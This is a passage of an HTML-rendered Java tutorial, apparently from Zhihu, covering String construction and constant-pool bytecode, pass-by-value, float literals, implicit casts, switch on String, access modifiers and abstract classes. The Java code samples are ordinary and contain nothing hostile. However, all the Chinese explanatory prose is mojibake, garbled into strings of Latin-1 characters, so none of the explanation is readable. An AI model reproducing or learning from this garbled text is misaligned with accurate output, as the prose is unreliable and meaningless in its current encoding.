class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">NewStringTest</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">String</span> <span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">(</span><span class=\"s\">&#34;abc&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>ä½¿ç”¨ javap -verbose è¿›è¡Œåç¼–è¯‘ï¼Œå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"c1\">// ...\n</span><span class=\"c1\"></span><span class=\"n\">Constant</span> <span class=\"nl\">pool:</span>\n<span class=\"c1\">// ...\n</span><span class=\"c1\"></span>   <span class=\"err\">#</span><span class=\"n\">2</span> <span class=\"o\">=</span> <span class=\"n\">Class</span>              <span class=\"err\">#</span><span class=\"n\">18</span>            <span class=\"c1\">// java/lang/String\n</span><span class=\"c1\"></span>   <span class=\"err\">#</span><span class=\"n\">3</span> <span class=\"o\">=</span> <span class=\"n\">String</span>             <span class=\"err\">#</span><span class=\"n\">19</span>            <span class=\"c1\">// abc\n</span><span class=\"c1\">// ...\n</span><span class=\"c1\"></span>  <span class=\"err\">#</span><span class=\"n\">18</span> <span class=\"o\">=</span> <span class=\"n\">Utf8</span>               <span class=\"n\">java</span><span class=\"o\">/</span><span class=\"n\">lang</span><span class=\"o\">/</span><span class=\"n\">String</span>\n  <span class=\"err\">#</span><span class=\"n\">19</span> <span class=\"o\">=</span> <span class=\"n\">Utf8</span>               <span class=\"n\">abc</span>\n<span class=\"c1\">// ...\n</span><span class=\"c1\"></span>\n  <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">String</span><span class=\"o\">[]);</span><span class=\"nl\">\n</span><span class=\"nl\">    descriptor:</span> <span class=\"o\">([</span><span class=\"n\">Ljava</span><span class=\"o\">/</span><span class=\"n\">lang</span><span class=\"o\">/</span><span class=\"n\">String</span><span class=\"o\">;)</span><span class=\"n\">V</span><span class=\"nl\">\n</span><span class=\"nl\">    flags:</span> <span class=\"n\">ACC_PUBLIC</span><span class=\"o\">,</span> <span class=\"n\">ACC_STATIC</span><span class=\"nl\">\n</span><span class=\"nl\">    Code:</span>\n      <span class=\"n\">stack</span><span class=\"o\">=</span><span class=\"n\">3</span><span class=\"o\">,</span> <span class=\"n\">locals</span><span class=\"o\">=</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">args_size</span><span class=\"o\">=</span><span class=\"n\">1</span><span class=\"nl\">\n</span><span class=\"nl\">         0:</span> <span class=\"k\">new</span>           <span class=\"err\">#</span><span class=\"n\">2</span>                  <span class=\"c1\">// class java/lang/String\n</span><span class=\"c1\"></span>         <span class=\"nl\">3:</span> <span class=\"n\">dup</span><span class=\"nl\">\n</span><span class=\"nl\">         4:</span> <span class=\"n\">ldc</span>           <span class=\"err\">#</span><span class=\"n\">3</span>                  <span class=\"c1\">// String abc\n</span><span class=\"c1\"></span>         <span class=\"nl\">6:</span> <span class=\"n\">invokespecial</span> <span class=\"err\">#</span><span class=\"n\">4</span>                  <span class=\"c1\">// Method java/lang/String.&#34;&lt;init&gt;&#34;:(Ljava/lang/String;)V\n</span><span class=\"c1\"></span>         <span class=\"nl\">9:</span> <span class=\"n\">astore_1</span>\n<span class=\"o\">//</span> <span class=\"o\">...</span></code></pre></div><p>åœ¨ Constant Pool ä¸­ï¼Œ#19 å­˜å‚¨è¿™å­—ç¬¦ä¸²å­—é¢é‡ &#34;abc&#34;ï¼Œ#3 æ˜¯ String Pool çš„å­—ç¬¦ä¸²å¯¹è±¡ï¼Œå®ƒæŒ‡å‘ #19 è¿™ä¸ªå­—ç¬¦ä¸²å­—é¢é‡ã€‚åœ¨ main æ–¹æ³•ä¸­ï¼Œ0: è¡Œä½¿ç”¨ new #2 åœ¨å †ä¸­åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œå¹¶ä¸”ä½¿ç”¨ ldc #3 å°† String Pool ä¸­çš„å­—ç¬¦ä¸²å¯¹è±¡ä½œä¸º String æ„é€ å‡½æ•°çš„å‚æ•°ã€‚</p><p>ä»¥ä¸‹æ˜¯ String æ„é€ å‡½æ•°çš„æºç ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œåœ¨å°†ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡ä½œä¸ºå¦ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡çš„æ„é€ å‡½æ•°å‚æ•°æ—¶ï¼Œå¹¶ä¸ä¼šå®Œå…¨å¤åˆ¶ value æ•°ç»„å†…å®¹ï¼Œè€Œæ˜¯éƒ½ä¼šæŒ‡å‘åŒä¸€ä¸ª value æ•°ç»„ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"nf\">String</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">original</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">value</span> <span class=\"o\">=</span> <span class=\"n\">original</span><span class=\"o\">.</span><span class=\"na\">value</span><span class=\"o\">;</span>\n    <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">hash</span> <span class=\"o\">=</span> <span class=\"n\">original</span><span class=\"o\">.</span><span class=\"na\">hash</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>ä¸‰ã€è¿ç®—</h2><h2>å‚æ•°ä¼ é€’</h2><p>Java çš„å‚æ•°æ˜¯ä»¥å€¼ä¼ é€’çš„å½¢å¼ä¼ å…¥æ–¹æ³•ä¸­ï¼Œè€Œä¸æ˜¯å¼•ç”¨ä¼ é€’ã€‚</p><p>ä»¥ä¸‹ä»£ç ä¸­ Dog dog çš„ dog æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå­˜å‚¨çš„æ˜¯å¯¹è±¡çš„åœ°å€ã€‚åœ¨å°†ä¸€ä¸ªå‚æ•°ä¼ å…¥ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œæœ¬è´¨ä¸Šæ˜¯å°†å¯¹è±¡çš„åœ°å€ä»¥å€¼çš„æ–¹å¼ä¼ é€’åˆ°å½¢å‚ä¸­ã€‚å› æ­¤åœ¨æ–¹æ³•ä¸­ä½¿æŒ‡é’ˆå¼•ç”¨å…¶å®ƒå¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæŒ‡é’ˆæ­¤æ—¶æŒ‡å‘çš„æ˜¯å®Œå…¨ä¸åŒçš„å¯¹è±¡ï¼Œåœ¨ä¸€æ–¹æ”¹å˜å…¶æ‰€æŒ‡å‘å¯¹è±¡çš„å†…å®¹æ—¶å¯¹å¦ä¸€æ–¹æ²¡æœ‰å½±å“ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Dog</span> <span class=\"o\">{</span>\n\n    <span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">;</span>\n\n    <span class=\"n\">Dog</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">name</span> <span class=\"o\">=</span> <span class=\"n\">name</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"n\">String</span> <span class=\"nf\">getName</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">name</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kt\">void</span> <span class=\"nf\">setName</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">name</span> <span class=\"o\">=</span> <span class=\"n\">name</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"n\">String</span> <span class=\"nf\">getObjectAddress</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">PassByValueExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Dog</span> <span class=\"n\">dog</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Dog</span><span class=\"o\">(</span><span class=\"s\">&#34;A&#34;</span><span class=\"o\">);</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getObjectAddress</span><span class=\"o\">());</span> <span class=\"c1\">// Dog@4554617c\n</span><span class=\"c1\"></span>        <span class=\"n\">func</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">);</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getObjectAddress</span><span class=\"o\">());</span> <span class=\"c1\">// Dog@4554617c\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>          <span class=\"c1\">// A\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">(</span><span class=\"n\">Dog</span> <span class=\"n\">dog</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getObjectAddress</span><span class=\"o\">());</span> <span class=\"c1\">// Dog@4554617c\n</span><span class=\"c1\"></span>        <span class=\"n\">dog</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Dog</span><span class=\"o\">(</span><span class=\"s\">&#34;B&#34;</span><span class=\"o\">);</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getObjectAddress</span><span class=\"o\">());</span> <span class=\"c1\">// Dog@74a14482\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>          <span class=\"c1\">// B\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>å¦‚æœåœ¨æ–¹æ³•ä¸­æ”¹å˜å¯¹è±¡çš„å­—æ®µå€¼ä¼šæ”¹å˜åŸå¯¹è±¡è¯¥å­—æ®µå€¼ï¼Œå› ä¸ºæ”¹å˜çš„æ˜¯åŒä¸€ä¸ªåœ°å€æŒ‡å‘çš„å†…å®¹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">class</span> <span class=\"nc\">PassByValueExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Dog</span> <span class=\"n\">dog</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Dog</span><span class=\"o\">(</span><span class=\"s\">&#34;A&#34;</span><span class=\"o\">);</span>\n        <span class=\"n\">func</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">);</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">getName</span><span class=\"o\">());</span>          <span class=\"c1\">// B\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">(</span><span class=\"n\">Dog</span> <span class=\"n\">dog</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">dog</span><span class=\"o\">.</span><span class=\"na\">setName</span><span class=\"o\">(</span><span class=\"s\">&#34;B&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/40480/is-java-pass-by-reference-or-pass-by-value\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow: Is Java â€œpass-by-referenceâ€ or â€œpass-by-valueâ€?</a></p><h2>float ä¸ double</h2><p>Java ä¸èƒ½éšå¼æ‰§è¡Œå‘ä¸‹è½¬å‹ï¼Œå› ä¸ºè¿™ä¼šä½¿å¾—ç²¾åº¦é™ä½ã€‚</p><p>1.1 å­—é¢é‡å±äº double ç±»å‹ï¼Œä¸èƒ½ç›´æ¥å°† 1.1 ç›´æ¥èµ‹å€¼ç»™ float å˜é‡ï¼Œå› ä¸ºè¿™æ˜¯å‘ä¸‹è½¬å‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"o\">//</span> <span class=\"kt\">float</span> <span class=\"n\">f</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">.</span><span class=\"na\">1</span><span class=\"o\">;</span></code></pre></div><p>1.1f å­—é¢é‡æ‰æ˜¯ float ç±»å‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">float</span> <span class=\"n\">f</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">.</span><span class=\"na\">1f</span><span class=\"o\">;</span></code></pre></div><h2>éšå¼ç±»å‹è½¬æ¢</h2><p>å› ä¸ºå­—é¢é‡ 1 æ˜¯ int ç±»å‹ï¼Œå®ƒæ¯” short ç±»å‹ç²¾åº¦è¦é«˜ï¼Œå› æ­¤ä¸èƒ½éšå¼åœ°å°† int ç±»å‹ä¸‹è½¬å‹ä¸º short ç±»å‹ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kt\">short</span> <span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"o\">//</span> <span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">s1</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">;</span></code></pre></div><p>ä½†æ˜¯ä½¿ç”¨ += æˆ–è€… ++ è¿ç®—ç¬¦å¯ä»¥æ‰§è¡Œéšå¼ç±»å‹è½¬æ¢ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">s1</span> <span class=\"o\">+=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"o\">//</span> <span class=\"n\">s1</span><span class=\"o\">++;</span></code></pre></div><p>ä¸Šé¢çš„è¯­å¥ç›¸å½“äºå°† s1 + 1 çš„è®¡ç®—ç»“æœè¿›è¡Œäº†å‘ä¸‹è½¬å‹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"kt\">short</span><span class=\"o\">)</span> <span class=\"o\">(</span><span class=\"n\">s1</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">);</span></code></pre></div><p><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/8710619/why-dont-javas-compound-assignment-operators-require-casting\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow : Why don&#39;t Java&#39;s +=, -=, *=, /= compound assignment operators require casting?</a></p><h2>switch</h2><p>ä» Java 7 å¼€å§‹ï¼Œå¯ä»¥åœ¨ switch æ¡ä»¶åˆ¤æ–­è¯­å¥ä¸­ä½¿ç”¨ String å¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">String</span> <span class=\"n\">s</span> <span class=\"o\">=</span> <span class=\"s\">&#34;a&#34;</span><span class=\"o\">;</span>\n<span class=\"k\">switch</span> <span class=\"o\">(</span><span class=\"n\">s</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">case</span> <span class=\"s\">&#34;a&#34;</span><span class=\"o\">:</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;aaa&#34;</span><span class=\"o\">);</span>\n        <span class=\"k\">break</span><span class=\"o\">;</span>\n    <span class=\"k\">case</span> <span class=\"s\">&#34;b&#34;</span><span class=\"o\">:</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;bbb&#34;</span><span class=\"o\">);</span>\n        <span class=\"k\">break</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>switch ä¸æ”¯æŒ longï¼Œæ˜¯å› ä¸º switch çš„è®¾è®¡åˆè¡·æ˜¯å¯¹é‚£äº›åªæœ‰å°‘æ•°çš„å‡ ä¸ªå€¼è¿›è¡Œç­‰å€¼åˆ¤æ–­ï¼Œå¦‚æœå€¼è¿‡äºå¤æ‚ï¼Œé‚£ä¹ˆè¿˜æ˜¯ç”¨ if æ¯”è¾ƒåˆé€‚ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"c1\">// long x = 111;\n</span><span class=\"c1\">// switch (x) { // Incompatible types. Found: &#39;long&#39;, required: &#39;char, byte, short, int, Character, Byte, Short, Integer, String, or an enum&#39;\n</span><span class=\"c1\">//     case 111:\n</span><span class=\"c1\">//         System.out.println(111);\n</span><span class=\"c1\">//         break;\n</span><span class=\"c1\">//     case 222:\n</span><span class=\"c1\">//         System.out.println(222);\n</span><span class=\"c1\">//         break;\n</span><span class=\"c1\"></span><span class=\"o\">//</span> <span class=\"o\">}</span></code></pre></div><p><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/2676210/why-cant-your-switch-statement-data-type-be-long-java\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">StackOverflow : Why can&#39;t your switch statement data type be long, Java?</a></p><h2>å››ã€ç»§æ‰¿</h2><h2>è®¿é—®æƒé™</h2><p>Java ä¸­æœ‰ä¸‰ä¸ªè®¿é—®æƒé™ä¿®é¥°ç¬¦ï¼šprivateã€protected ä»¥åŠ publicï¼Œå¦‚æœä¸åŠ è®¿é—®ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºåŒ…çº§å¯è§ã€‚</p><p>å¯ä»¥å¯¹ç±»æˆ–ç±»ä¸­çš„æˆå‘˜ï¼ˆå­—æ®µä»¥åŠæ–¹æ³•ï¼‰åŠ ä¸Šè®¿é—®ä¿®é¥°ç¬¦ã€‚</p><ul><li>ç±»å¯è§è¡¨ç¤ºå…¶å®ƒç±»å¯ä»¥ç”¨è¿™ä¸ªç±»åˆ›å»ºå®ä¾‹å¯¹è±¡ã€‚</li><li>æˆå‘˜å¯è§è¡¨ç¤ºå…¶å®ƒç±»å¯ä»¥ç”¨è¿™ä¸ªç±»çš„å®ä¾‹å¯¹è±¡è®¿é—®åˆ°è¯¥æˆå‘˜ï¼›</li></ul><p>protected ç”¨äºä¿®é¥°æˆå‘˜ï¼Œè¡¨ç¤ºåœ¨ç»§æ‰¿ä½“ç³»ä¸­æˆå‘˜å¯¹äºå­ç±»å¯è§ï¼Œä½†æ˜¯è¿™ä¸ªè®¿é—®ä¿®é¥°ç¬¦å¯¹äºç±»æ²¡æœ‰æ„ä¹‰ã€‚</p><p>è®¾è®¡è‰¯å¥½çš„æ¨¡å—ä¼šéšè—æ‰€æœ‰çš„å®ç°ç»†èŠ‚ï¼ŒæŠŠå®ƒçš„ API ä¸å®ƒçš„å®ç°æ¸…æ™°åœ°éš”ç¦»å¼€æ¥ã€‚æ¨¡å—ä¹‹é—´åªé€šè¿‡å®ƒä»¬çš„ API è¿›è¡Œé€šä¿¡ï¼Œä¸€ä¸ªæ¨¡å—ä¸éœ€è¦çŸ¥é“å…¶ä»–æ¨¡å—çš„å†…éƒ¨å·¥ä½œæƒ…å†µï¼Œè¿™ä¸ªæ¦‚å¿µè¢«ç§°ä¸ºä¿¡æ¯éšè—æˆ–å°è£…ã€‚å› æ­¤è®¿é—®æƒé™åº”å½“å°½å¯èƒ½åœ°ä½¿æ¯ä¸ªç±»æˆ–è€…æˆå‘˜ä¸è¢«å¤–ç•Œè®¿é—®ã€‚</p><p>å¦‚æœå­ç±»çš„æ–¹æ³•é‡å†™äº†çˆ¶ç±»çš„æ–¹æ³•ï¼Œé‚£ä¹ˆå­ç±»ä¸­è¯¥æ–¹æ³•çš„è®¿é—®çº§åˆ«ä¸å…è®¸ä½äºçˆ¶ç±»çš„è®¿é—®çº§åˆ«ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿å¯ä»¥ä½¿ç”¨çˆ¶ç±»å®ä¾‹çš„åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å­ç±»å®ä¾‹ï¼Œä¹Ÿå°±æ˜¯ç¡®ä¿æ»¡è¶³é‡Œæ°æ›¿æ¢åŸåˆ™ã€‚</p><p>å­—æ®µå†³ä¸èƒ½æ˜¯å…¬æœ‰çš„ï¼Œå› ä¸ºè¿™ä¹ˆåšçš„è¯å°±å¤±å»äº†å¯¹è¿™ä¸ªå­—æ®µä¿®æ”¹è¡Œä¸ºçš„æ§åˆ¶ï¼Œå®¢æˆ·ç«¯å¯ä»¥å¯¹å…¶éšæ„ä¿®æ”¹ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼ŒAccessExample æ‹¥æœ‰ id å…¬æœ‰å­—æ®µï¼Œå¦‚æœåœ¨æŸä¸ªæ—¶åˆ»ï¼Œæˆ‘ä»¬æƒ³è¦ä½¿ç”¨ int å­˜å‚¨ id å­—æ®µï¼Œé‚£ä¹ˆå°±éœ€è¦ä¿®æ”¹æ‰€æœ‰çš„å®¢æˆ·ç«¯ä»£ç ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AccessExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"n\">id</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><p>å¯ä»¥ä½¿ç”¨å…¬æœ‰çš„ getter å’Œ setter æ–¹æ³•æ¥æ›¿æ¢å…¬æœ‰å­—æ®µï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥æ§åˆ¶å¯¹å­—æ®µçš„ä¿®æ”¹è¡Œä¸ºã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AccessExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">id</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">getId</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">id</span> <span class=\"o\">+</span> <span class=\"s\">&#34;&#34;</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">setId</span><span class=\"o\">(</span><span class=\"n\">String</span> <span class=\"n\">id</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">id</span> <span class=\"o\">=</span> <span class=\"n\">Integer</span><span class=\"o\">.</span><span class=\"na\">valueOf</span><span class=\"o\">(</span><span class=\"n\">id</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>ä½†æ˜¯ä¹Ÿæœ‰ä¾‹å¤–ï¼Œå¦‚æœæ˜¯åŒ…çº§ç§æœ‰çš„ç±»æˆ–è€…ç§æœ‰çš„åµŒå¥—ç±»ï¼Œé‚£ä¹ˆç›´æ¥æš´éœ²æˆå‘˜ä¸ä¼šæœ‰ç‰¹åˆ«å¤§çš„å½±å“ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AccessWithInnerClassExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">class</span> <span class=\"nc\">InnerClass</span> <span class=\"o\">{</span>\n        <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">private</span> <span class=\"n\">InnerClass</span> <span class=\"n\">innerClass</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">AccessWithInnerClassExample</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">innerClass</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">InnerClass</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">getValue</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">innerClass</span><span class=\"o\">.</span><span class=\"na\">x</span><span class=\"o\">;</span>  <span class=\"c1\">// ç›´æ¥è®¿é—®\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>æŠ½è±¡ç±»ä¸æ¥å£</h2><p><b>1. æŠ½è±¡ç±»</b> </p><p>æŠ½è±¡ç±»å’ŒæŠ½è±¡æ–¹æ³•éƒ½ä½¿ç”¨ abstract å…³é”®å­—è¿›è¡Œå£°æ˜ã€‚å¦‚æœä¸€ä¸ªç±»ä¸­åŒ…å«æŠ½è±¡æ–¹æ³•ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å¿…é¡»å£°æ˜ä¸ºæŠ½è±¡ç±»ã€‚</p><p>æŠ½è±¡ç±»å’Œæ™®é€šç±»æœ€å¤§çš„åŒºåˆ«æ˜¯ï¼ŒæŠ½è±¡ç±»ä¸èƒ½è¢«å®ä¾‹åŒ–ï¼Œéœ€è¦ç»§æ‰¿æŠ½è±¡ç±»æ‰èƒ½å®ä¾‹åŒ–å…¶å­ç±»ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">abstract</span> <span class=\"kd\">class</span> <span class=\"nc\">AbstractClassExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">protected</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">abstract</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">();</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func2</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;func2&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AbstractExtendClassExample</span> <span class=\"kd\">extends</span> <span class=\"n\">AbstractClassExample</span> <span class=\"o\">{</span>\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span 